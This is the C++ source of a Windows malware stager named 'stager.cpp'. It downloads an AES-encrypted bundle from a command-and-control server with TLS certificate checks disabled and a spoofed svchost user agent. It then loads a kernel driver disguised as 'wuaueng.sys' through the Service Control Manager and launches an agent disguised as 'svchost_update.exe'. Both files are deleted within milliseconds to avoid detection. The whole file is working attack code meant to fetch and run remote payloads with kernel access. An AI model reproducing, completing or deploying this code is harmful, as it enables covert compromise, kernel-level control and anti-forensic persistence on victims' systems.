// stager.cpp
// Fetches AES-encrypted bundle from C2, loads driver kernel-side,
// drops jocky_agent.exe briefly to disk and launches it, then deletes it.
// Driver touches disk for ~10ms while SCM maps it; agent file for ~100ms
// while the Windows loader maps it into its own process — then deleted.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef C2_HOST
#define C2_HOST L"127.0.0.1"
#endif
#ifndef AES_KEY_HEX
#define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
#endif

// ── Bundle format ────────────────────────────────────────────────────
// [BundleHeader 16B][FileEntry × num_files][file data...]
// Entire thing: base64( AES-256-CBC( IV[16] || plaintext ) )
//
// FileEntry offsets are absolute into the plaintext bundle buffer.
//
#pragma pack(push, 1)
struct BundleHeader {
    char    magic[4];     // "JCKY"
    uint8_t version;      // 0x01
    uint8_t num_files;
    uint8_t reserved[10];
};
struct BundleEntry {
    uint8_t  file_type;   // TYPE_DRIVER=0x01  TYPE_AGENT=0x04
    uint32_t size;
    uint64_t offset;      // absolute offset into plaintext bundle
};
#pragma pack(pop)

#define TYPE_DRIVER 0x01
#define TYPE_AGENT  0x04

static uint8_t g_aesKey[32] = {};

static void HexDecode(const char* hex, uint8_t* out, size_t outLen) {
    for (size_t i = 0; i < outLen; i++) {
        unsigned int b = 0;
        sscanf_s(hex + i * 2, "%02x", &b);
        out[i] = (uint8_t)b;
    }
}

static bool Base64Decode(const std::string& b64, std::vector<uint8_t>& out) {
    DWORD outLen = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                              CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL))
        return false;
    out.resize(outLen);
    return !!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                                  CRYPT_STRING_BASE64, out.data(), &outLen, NULL, NULL);
}

static bool AesDecrypt(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
    if (input.size() < 16) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return false;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      (ULONG)((wcslen(BCRYPT_CHAIN_MODE_CBC) + 1) * sizeof(wchar_t)), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, g_aesKey, 32, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    uint8_t iv[16];
    memcpy(iv, input.data(), 16);
    const uint8_t* cipher    = input.data() + 16;
    ULONG          cipherLen = (ULONG)(input.size() - 16);

    ULONG plainLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)cipher, cipherLen, NULL,
                  iv, 16, NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING);
    output.resize(plainLen);
    NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)cipher, cipherLen, NULL,
                                iv, 16, output.data(), plainLen, &plainLen, BCRYPT_BLOCK_PADDING);
    if (st == 0) output.resize(plainLen);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return st == 0;
}

static bool HttpGet(const wchar_t* path, std::string& body) {
    HINTERNET hSession = WinHttpOpen(L"svchost/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConn = WinHttpConnect(hSession, C2_HOST, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) {
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA    |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq);
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD status = 0, statusLen = sizeof(status);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusLen, WINHTTP_NO_HEADER_INDEX);

    if (status == 200) {
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
            std::string chunk((size_t)avail, '\0');
            DWORD read = 0;
            WinHttpReadData(hReq, &chunk[0], avail, &read);
            body.append(chunk.data(), read);
        }
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return status == 200;
}

// Write driver to %TEMP%\wuaueng.sys, load via SCM, delete immediately.
// Once StartService returns the driver is mapped in kernel memory —
// the on-disk file is no longer needed.
static bool LoadDriver(const uint8_t* buf, uint32_t size) {
    char tempDir[MAX_PATH], sysPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    snprintf(sysPath, MAX_PATH, "%swuaueng.sys", tempDir);

    HANDLE hFile = CreateFileA(sysPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hFile, buf, size, &written, NULL);
    CloseHandle(hFile);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hScm) { DeleteFileA(sysPath); return false; }

    SC_HANDLE hSvc = CreateServiceA(hScm, "JockyDrv", "JockyDrv",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        sysPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc)
        hSvc = OpenServiceA(hScm, "JockyDrv", SERVICE_ALL_ACCESS);

    if (!hSvc) {
        CloseServiceHandle(hScm);
        DeleteFileA(sysPath);
        return false;
    }

    BOOL started = StartService(hSvc, 0, NULL);
    DWORD err    = GetLastError();

    DeleteFileA(sysPath); // driver is in kernel — file gone

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return started || err == ERROR_SERVICE_ALREADY_RUNNING;
}

int main() {
    HexDecode(AES_KEY_HEX, g_aesKey, 32);

    // 1. Fetch base64(AES(bundle)) from C2
    std::string b64body;
    if (!HttpGet(L"/api/v1/agent/bundle", b64body))
        return 1;

    // 2. Base64 decode
    std::vector<uint8_t> encrypted;
    if (!Base64Decode(b64body, encrypted))
        return 1;

    // 3. AES-256-CBC decrypt
    std::vector<uint8_t> plain;
    if (!AesDecrypt(encrypted, plain))
        return 1;

    // 4. Validate header
    if (plain.size() < sizeof(BundleHeader)) return 1;
    BundleHeader* hdr = reinterpret_cast<BundleHeader*>(plain.data());
    if (memcmp(hdr->magic, "JCKY", 4) != 0) return 1;
    if (hdr->version != 0x01) return 1;

    // 5. Walk file table
    BundleEntry* table = reinterpret_cast<BundleEntry*>(
        plain.data() + sizeof(BundleHeader));

    uint8_t* driverBuf = nullptr; uint32_t driverSize = 0;
    uint8_t* agentBuf  = nullptr; uint32_t agentSize  = 0;

    for (uint8_t i = 0; i < hdr->num_files; i++) {
        if (table[i].offset + table[i].size > plain.size()) return 1; // bounds check
        if (table[i].file_type == TYPE_DRIVER) {
            driverBuf  = plain.data() + table[i].offset;
            driverSize = table[i].size;
        } else if (table[i].file_type == TYPE_AGENT) {
            agentBuf  = plain.data() + table[i].offset;
            agentSize = table[i].size;
        }
    }

    if (!driverBuf || !agentBuf) return 1;

    // 6. Load driver — write, SCM start, delete immediately after StartService
    if (!LoadDriver(driverBuf, driverSize))
        return 1;

    // 7. Write agent to %TEMP%, launch it, delete the file.
    //    The Windows loader maps the image into the new process before we delete —
    //    ~100ms is more than enough, but we wait for the process handle to be valid.
    char tempDir[MAX_PATH], agentPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    snprintf(agentPath, MAX_PATH, "%ssvchost_update.exe", tempDir);

    HANDLE hf = CreateFileA(agentPath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 1;
    DWORD written = 0;
    WriteFile(hf, agentBuf, agentSize, &written, NULL);
    CloseHandle(hf);
    if (written != agentSize) { DeleteFileA(agentPath); return 1; }

    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(agentPath, NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(agentPath);
        return 1;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Give the loader time to map the image (~100ms headroom).
    Sleep(150);
    DeleteFileA(agentPath);

    return 0;
}
